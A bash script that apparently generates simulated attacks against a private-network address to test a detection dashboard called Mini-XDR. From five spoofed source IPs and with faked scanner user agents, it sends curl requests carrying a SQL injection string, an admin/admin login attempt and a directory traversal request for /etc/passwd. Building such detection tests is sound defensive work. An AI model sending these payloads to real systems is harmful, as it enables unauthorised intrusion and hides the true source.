#!/bin/bash
# 🚨 Simple Multi-IP Attack for Mini-XDR Testing
# Creates multiple incidents from different "source" IPs

TARGET_IP="192.168.168.1"

# Fake source IPs (known malicious IPs for realistic threat intel)
ATTACK_IPS=(
    "185.220.101.32"    # Tor exit node
    "45.148.10.124"     # Known malicious
    "103.94.108.114"    # Suspicious IP
    "192.241.202.137"   # VPS abuse
    "89.248.165.74"     # European threat
)

echo "🚨 Multi-IP Attack Test"
echo "🎯 Target: $TARGET_IP"
echo "📡 Creating incidents from ${#ATTACK_IPS[@]} different IPs"
echo ""

# Attack from each fake IP
for i in "${!ATTACK_IPS[@]}"; do
    fake_ip="${ATTACK_IPS[$i]}"
    
    echo "🔥 [Attack $((i+1))/${#ATTACK_IPS[@]}] Attacking from $fake_ip"
    
    # SQL Injection with IP spoofing
    curl -s -A "sqlmap/1.4.7#stable" \
         -H "X-Forwarded-For: $fake_ip" \
         -H "X-Real-IP: $fake_ip" \
         "http://$TARGET_IP/?id='%20OR%20'1'='1&search='%20OR%20'1'='1" > /dev/null
    echo "  └─ SQL injection sent"
    
    # Brute force attempt
    curl -s -X POST -A "Hydra v9.1" \
         -H "X-Forwarded-For: $fake_ip" \
         -H "X-Real-IP: $fake_ip" \
         -d "username=admin&password=admin" \
         "http://$TARGET_IP/login" > /dev/null
    echo "  └─ Brute force attempt sent"
    
    # Directory traversal
    curl -s -A "DirBuster-1.0-RC1" \
         -H "X-Forwarded-For: $fake_ip" \
         -H "X-Real-IP: $fake_ip" \
         "http://$TARGET_IP/../../../etc/passwd" > /dev/null
    echo "  └─ Directory traversal sent"
    
    echo "✅ Attack from $fake_ip completed"
    sleep 3  # Pause between IPs
done

echo ""
echo "🎉 Multi-IP attacks completed!"
echo "📊 Expected: ${#ATTACK_IPS[@]} separate incidents"
echo "🛡️  Check dashboard: http://$TARGET_IP:3000"
echo ""
echo "IPs to look for:"
for ip in "${ATTACK_IPS[@]}"; do
    echo "  • $ip"
done

